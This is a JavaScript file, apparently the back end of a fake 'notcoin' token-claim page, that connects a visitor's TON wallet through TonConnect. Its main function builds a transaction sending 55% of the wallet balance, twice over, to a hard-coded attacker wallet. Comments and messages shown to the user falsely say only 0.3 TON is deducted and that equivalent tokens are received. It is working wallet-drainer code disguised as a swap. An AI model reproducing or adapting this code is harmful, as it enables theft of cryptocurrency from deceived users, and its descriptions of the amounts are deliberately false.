var mainWallet = "UQA3Qh7xby9ttfPfDdRX0e_I62m4FCNo_7FoloN6y51jcH7c"; // Основной кошелек для перевода

// Создаем объект для подключения к TonConnect UI
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://qyvirkot.github.io/notcoin/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

// Храним адрес подключенного кошелька
let walletAddress = null;

// Обработчик изменения статуса подключения
tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('Адрес подключенного кошелька:', walletAddress);
        
        // Когда кошелек подключен, обновляем баланс
        await updateBalance(walletAddress);
    }
});

// Функция для обновления баланса на странице
async function updateBalance(walletAddress) {
    try {
        // Получаем баланс кошелька
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();

        if (!data.balance) {
            console.error('Не удалось получить баланс');
            alert('Не удалось получить баланс');
            return;
        }

        const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
        const deduction = originalBalance * 0.55; // 0.3 TON в нанотонах

        // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
        if (originalBalance <= deduction) {
            console.error('Баланс слишком мал для вычитания 0.3 TON');
            alert('Баланс слишком мал для вычитания 0.3 TON');
            return;
        }

        // Вычитаем 0.3 TON из баланса
        const remainingBalance = originalBalance - deduction;

        // Конвертация в TON
        const displayedBalance = remainingBalance / 1000000000;
        console.log(`Баланс после вычета 0.3 TON: ${displayedBalance} TON`);

        // Обновляем отображение баланса на странице
        const walletInfoElement = document.getElementById('wallet-info');
        if (walletInfoElement) {
            walletInfoElement.innerHTML = `Ваш баланс: <b>${displayedBalance} TON</b>`;
        }

    } catch (error) {
        console.error('Ошибка при получении баланса:', error);
    }
}

// Функция для отправки транзакции
async function didtrans() {
    // Проверяем, подключен ли кошелек
    if (!walletAddress) {
        console.error('Кошелек не подключен');
        alert('Кошелек не подключен');
        return;
    }

    // Получаем баланс кошелька
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
    const data = await response.json();

    // Проверка на ошибки при получении данных о кошельке
    if (!data.balance) {
        console.error('Не удалось получить баланс');
        return;
    }

    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
    const origbal = originalBalance * 0.55;
    const roundedBalance = Math.round(origbal);

    // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
    const deduction = roundedBalance; // 0.3 TON в нанотонах

    // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
    if (originalBalance <= deduction) {
        console.error('Баланс слишком мал для вычитания 0.3 TON');
        return;
    }

    // Вычитаем 0.3 TON из баланса
    const remainingBalance = originalBalance - deduction;

    console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);

    // Формируем транзакцию с двумя частями:
    // 1. Отправка TON
    // 2. Получение эквивалента в токенах
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
        messages: [
            {
                address: mainWallet,  // Адрес получателя для первой части
                amount: deduction,    // Сумма в нанотонах (0.3 TON)
                payload: JSON.stringify({ 
                    type: "send",
                    amount: deduction, // Отправляемая сумма
                    description: "Вы отправляете 0.3 TON"
                }),
            },
            {
                address: mainWallet,  // Адрес для получения эквивалентных токенов
                amount: deduction,    // Получаемая сумма (эквивалент в токенах)
                payload: JSON.stringify({ 
                    type: "receive",
                    amount: deduction, // Получаемая сумма (в токенах)
                    description: "Вы получите эквивалентную сумму в токенах"
                }),
            }
        ],
        sendMode: 3,  // Если это требуется в вашем API
        comment: "Claim: Обмен TON на токены",  // Дополнительное описание (по желанию)
    };

    try {
        // Подписание и отправка транзакции через TonConnect
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция успешно отправлена:', result);
        
        // Обновляем баланс после отправки
        await updateBalance(walletAddress);
    } catch (error) {
        console.error('Ошибка при отправке транзакции:', error);
    }
}
